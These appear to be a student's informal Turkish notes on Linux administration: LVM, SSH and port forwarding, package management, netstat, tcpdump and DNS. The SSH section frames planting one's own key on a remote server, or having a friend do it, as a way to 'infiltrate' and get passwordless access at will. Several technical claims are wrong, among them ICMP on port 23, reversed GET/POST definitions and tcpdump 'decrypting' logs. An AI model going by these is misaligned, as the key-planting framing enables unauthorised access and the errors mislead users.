*	üzerinde olduğun veya belirttiğin şeyin nelerin kullandığını listeler  
  
swapoff   
*	swap alanını yokediyor  

swapon -s  
*	swapi görüntüler  
  
mount -t /dev/sdb1   
mount -t iso9660 -o loop,ro /dev/sr0 /mnt/  
*	eskiden cd otomatik olarak baglanamayinca bu sekilde mount etmeye yarar  
  
du  
*	bulunulan dizindeki dosyalarin boyut bilgilerini verir  
  
pvcreate /dev/sdb1  
*	fiziksel disk olusturur  

vgcreate  
*	volume grup olusturur  

lvcreate  
*	olusturdugun volume gruptan bir fiziksel volume olusturnaya yarar  

-L   
*	boyut belirlemeye yarar  

-n  
*	logical vilume ne isim verilecegini belirler  
  
olusturulan partitionun %5 lik bir kismi roota ayrilir bu sayede disk dolarsa uzaktan  
root haklariyla erisip sistemi kurtarmak icin  
  
vgextend   
*	diski genisletmeye yarar  
  
resize2fs  
*	her seyi tanittiktan sonra genisletmeye yarar  
  
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\   
arastir how to resize disk with linux terminal ||||||||||  
//////////////////////////////////////////////////  
  
  
SSH   
  
telnet guvensiz oldugundan dolayi kendi koprusunu olusturup uzak sunucuya baglanti yapmamizi saglar  
  
ssh-keygen  
ssh key generator  
id_rsa ve pub da tum karakterlerin alinmasi lazim begin ve end de dahil edilerek  
  
  
  
------------------------------------------------------------------------  
ssh keygeni uzaktaki sunucunun ssh keygeni ile degistirip veya yanina kaydedince   
sifresiz olarak uzak sunucuya sizmis oluruz lakin  
ssh kopyaladiktan sonra izinler 644 olarak durur bu ise ssh icin guvensiz bir seydir  
izinleri 600 olarak degistirince sifresiz olarak login oluruz  
istedigimiz zaman sifresiz girebilirirz  
klasor izni ise 700 olmalidir  

-------------------------------------------------------------------------  
bir baska baglanan bilgisayara kendi ssh keygeni ni atabilir arkadastan isteme  
ile sizilabilor  
======================================================================================]  

ssh-copy-id 
*	ssh keyi otomatik olarak ekler uzaga kopyalar  

--------------------------------------------------------------------------------------  
  
#############################################################################################  
#####   ssh root@192.168.1.1  ls 								#########  
*	uzak sunucuda ls komutunu calistirir								#########  
parola girdikten sonra yazinin sonundaki komutu calistirir					#########  

#############################################################################################  

uzak sunucunun ssh keyini kendimize kopyalarsak o key ile parolasiz girmemiz saglanir  
  
  
sanal makinede systemctl start sshd ile ssh servisi acik olmali  
daha sonra  
linux terminalde  
ssh [username]@[ip address]  
yazilip baglanilir  
w ile o anda login olan kullanicilari yazar  
  
uzak sunucu: 10.47.1.1  
seninki:   
arkadas 192.168.1.1  
  
/etc/sshd  
*	ssh servisinin config dosyasini iceriryu  
  
LOCAL PORT YONLENDIRME  
  
ssh -L  
*	uzaktaki sunucuyu kendine yonlendirmeye yarar  
local port yonlendirme yapar  
  
ssh -L 2222:192.168.102.138:22 root@10.47.1.1  
*	uzaktaki 10.47.1.1 sunucusuna baglandi oranin icerisinde  

ssh root@localhost -p2222  
*	oradaki ssh i 2222 sportumuza gonderir  
  
  
REMOTE PORT YONLENDIRME  
  
ssh -R 192.168.2.2:22 mustafaaats@10.47.1.1  
  
*	baska bir bilgisayar bu komutu girerse onun sayesinde senin bilgisayarina baglanti gelir  
bi arkadasindan rica edersen olur  
o arkadas  
ssh root@localhost -p5555  
yazarsa ulasilacak server arkadasin yazdigi komut sayesinde bizim bilgisayarimiza dokulmus olacak  
  
  
DINAMIC PORT YONLENDIRME  
  
ssh -D 9595 vpn  
*	vpn tanimlanip araya girilebilir  
  
  
  
telnet bir bilgisayara baska portlardan baglanmamizi saglar  
telnet guvensiz bir protokol.  dinlenme olayi olabilir  
  
/etc/ssh/sshd_config  
*	ssh ayarlarinin tutuldugu dizinlerden biri  
  
systemctl status sshd.service  
*	ssh durumunu goruntuler  
  
  
  
============================================================  
yum provides */paketismi   
*	paketin bagli oldugu paketi gosterir  
-0=0=0=-0=-00=-0=-0-0=-0-=--=-0=-0=-0=0=-0=-0=0=-0=-0=-0=0=0=0  

============================================================  
  
scp mchd@192.168.1.1:/tmp/lyk /tmp  
*	uzak sunucudaki tmp lyk dosyasini kendi tmp dizinine kopyalamaya yarar  
  
scp /tmp/lyk2017 root@10.47.1.1:/tmp/lyk  
*	uzaktaki sunucuya dosya gondermeye yarar  
  
scp id_rsa root  
  
  
		PAKET YONETIMI  
  
*	debian 		apt-get		dpkg		ppa  
*	red-hat 	yum		rpm		epel  
*	arch 		pacman  
  
yum her zaman community kontrolu ile alinir  
  
debian unstable depolarida olabiliyor  
  
apt-get update			paket update  
apt-get upgrade			normal upgrade  
apt-get dist-upgrade		kernel update  
apt-get install			tekli install  
  
  
yum update					kernele kadar upgrade yapildigindan guncellerken cikmak tehlikleidir. kernel silinebilir  
--execute 					su haric tum paketleri indir demek  
yum provides */ifconfig		tum paketlerde bu komutu arar  
yum install net-tools		indirmeye yarar  
yum search ifconfig			tum paketlerde bu komutu arar  
yum history					yapilan tum guncellemeleri tutar  
yum history undo 			yaptigin tum islemleri geri alabilirsin ---- alamazsin  
yum history undo 7			sadece 7. paket yuklemesini geri kaldirir yada silindiyse geri getirir/ tersini yapar  
yum remove					silmeye yarar sonunda sectigimiz paketi  
yum remove purge			paketin neyi var neyi yoksa siler	  
yum history info 7			7. history  
-y							gelen sorulara yes cevabini ver  
  
REPOLAR  
*	eger icerisinde bu program yoksa sonradan repo olarak indirip kurmamizi saglar  
  
  
mirror  
*	her yerin ayri ayri search paketlerinin toplandigi yerdir  

dependencies  
*	bagimliliklar  bir seyi calistirabilmek icin yaninda gelen yardimci uygulamaciklardir  
  
/etc/yum  
*	klasoru altinda yum configurasyonlari bulunur  

/etc/yum/yum.repos.d  
  
wget  
curl  
*	download yapmaya yarar  

rpm -qa   
*	sunucu uzerinde kurulu olan paketleri gosterir  
  
  
  
DNS Domain Name Server  
  
  
  
  
		LOG ANALIZI  
log rotate arastir.  
  
/etc/log_rotate		log dosyalari bilgisi tutup zamani gecmis dosyalari bir yere s|k|stirarak gonderir  
/var/log/secure 	kullanicilarin giris cikislarini tutar  
/etc/dmesg			disk logunu verir				dmesg komutu kullanilir anlik almak icin  
  
  
  
  
							NETWORK	NETWORK	NETWORK	NETWORK NETWORK   
	NETWORK			NETWORK NETWORK	NETWORK	NETWORK	NETWORK	NETWORK	NETWORK			NETWORK  
			NETWORK NETWORK 		NETWORK	NETWORK	NETWORK			NETWORK	NETWORK  
					NETWORK	NETWORK	NETWORK	NETWORK	NETWORK	NETWORK	NETWORK  
							NETWORK	NETWORK			NETWORK	NETWORK		  
									NETWORK	NETWORK	NETWORK		  
											NETWORK	    
  
  
			TCP/IP  
  
curl ifconfig.co  
  
  
  
WAN  
*	uzak makine		curl ifconfig.co  

LAN  
*	kendi ana makinen  

Gateway  
*	makineye nereden disari cikacagini belirlersin  
  
  
/etc/resolv.conf  
*	ip dns cozumlendigi yer  
dosya icerisinde gateway ipleri var  
  
TCP/IP  
  
*	tcp udp portlariyla uzaktaki arkadasin 23 portuna   
  
udp  
*	syn ack yapar ggeri almadan synack olmasina gerek yok  
yani istegi gonderir ama kontrol etmez  
  
  
mac  
*	makinenin fiziksel adresidir  
  
ip addr  
*	ip bilgisini verir

/etc/sysconfig/network-scripts/ifcfg-enp0s3  
*	static ip tanimlamasi yapilan yer  
  
BOOTPROTO=DHCP > static		bana asagida istedigim ip yi ver demek  
ONBOOT="yes"  
IPADDR=10.47.92.167  
PREFIX=16  
GATEWAY=10.47.1.1  
  
*	Static ip tanimlamasi yapilir  
  
route -n  
*	ip bilgilerini doker  
  
  
loopback 127.0.0.1  
*	bilgisayarin kendisidir  
  
  
  
  
  
  
  
netstat  
*	sunucu uzerinde hangi portlar acik onu gosterir  
  
netstat -antp  
*	acik olan tcp portlarini gosterir  
stcp portlarinin yaninda ayrintili bilgi doker  
  
  
LISTEN  
*	bekliyor  

ESTABLISHED  
*	baglanmis  
  
en cok udp 53 tur portu  
  
http 		80  
https		443  
mysql 		3306  
ftp 		21  
icmp		23  
smtp		25  
dns-udp		53  
ssh			22  
  
  
ssh ta connection refused derse  
netstat -antp 
*	ile 22 portunu dinliyormu diye bakilir  
    
nmap kapanabiliyor firewall uzerinden  
  
tcpdump  
*	istedigimiz portu dinlemeye yarar  

tcpdump port 80  
*	80 portunu dinlemeye yarar  
  
tcpdump port 80 -w /path/80.log  
*	paket geldikce anlik save yapmaya yarar  
  
tcpdump -r   
*	encrypt edilen log dosyasini decrypt etmeye yarar  
anlasilabilir olur  
  
  
  
		DNS	(Domain Name Server)  
  
  
*	bir sitenin ip adresini akilda tutma sorununa cozum olarak ip ye bir isim verir erisim kolayligi olmasi icin  
  
NS	Name Server  
A	IP Addres  
AAA	IPv6  
MX	Mail Server  
CNAME	Nick Name	facebook.com	www.facebook.com	www da facebooktur  
TTL	Time To Live  
  
nslookup  
*	bilgi toplama komutu  

dig  
*	bilgi toplama icin kullanilan komutlardan biri  
  
dig facebook.com @8.8.8.8  
*	8888 google in ip si  
*	yukaridaki parametre facebook.com u google a sor demek  
  
/etc/resolv.conf altinda yer alir  
*	senin ns sorgunun bulundugu yer  
  
  
/etc/hosts  
*	name server ayarlarini konfigure etmemize yarayan dizin  
  
0.0.0.0 twitter.com  
*	twittera girmeyi engeller gibi birsey  
buna benzer yontemlerle bildirim popup vb. gibi seyler kapatilabilir  
  
/etc/hosts icine  
*	192.168.1.1		my_pc  
*	yazarsak her seferinde ip yi yazmak yerine ismi yazarak kolaylikla baglanmayi saglariz  
  
ssh root@my_pc  
*	ile baglanir  
  
  
  
reverse proxy  
*	gelen trafikleri kendi üzerine alıp sistemin adını gizler  
arka tarafta olan asıl makinenin IP sini gizler  
kendisi alıcıyla iletişime girip ana makineye erişimi elden ele uzatır  
en arkadan soföre uzatılan paranın kimin gönderdiğini gizlemek için kullanılır F.E  
  
  
  
LB>CACHE>WEB SERVICES>DB	DUNYA(superonlıne,ttnet,vodafone)  
  
Domaın name server DNS  
com, tr us uk  
net, tr us uk  
org  
  
  
  
ddos ta daha önceden bulunan bir botu erişim almadan dışarı atıyor veya  
bir mause a ortalama tıklanma sayısının üzerinde giriş olunca uzaklaştırıyor  
  
cookie bir kez tuttuktan sonra tekrar sormadan onaylar sıteye gırerken  
  
  
get   
*	gelen istek  

post   
*	gönderilen istek  
  
  
SSL ile güvenlik bağlantı = http https farkı ile aynı  
https http nin ssl ile güvenleşmiş hali  
  
------------------------------------------  
HTTP HATALARI WIKIPEDIADAN PAK  
404, 503, 301 vs vs  
------------------------------------------  
  
Dinamik DNS  
*	sürekli değişen ıp  

statik DNS  
*	ise satın alınan ıp  
  
  
wall  
*	uzak sunucuda bi şeyler yazmamızı sağlar sshta  
  
  
whois IP  
*	ip adreslerini doker  
  
cat >> asd  
*	daha sonrasinda ne yazarsan onu asd dosyasina yazar ctrl c yapana kadar  
  
echo "ad  
asdk  
adla]sda  
ad  
ada  
sd" >> asd  
  
gibi ama sinirsiz  
   
  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././  
  
    
extended attribute  
nasıl hashliyor  
.  
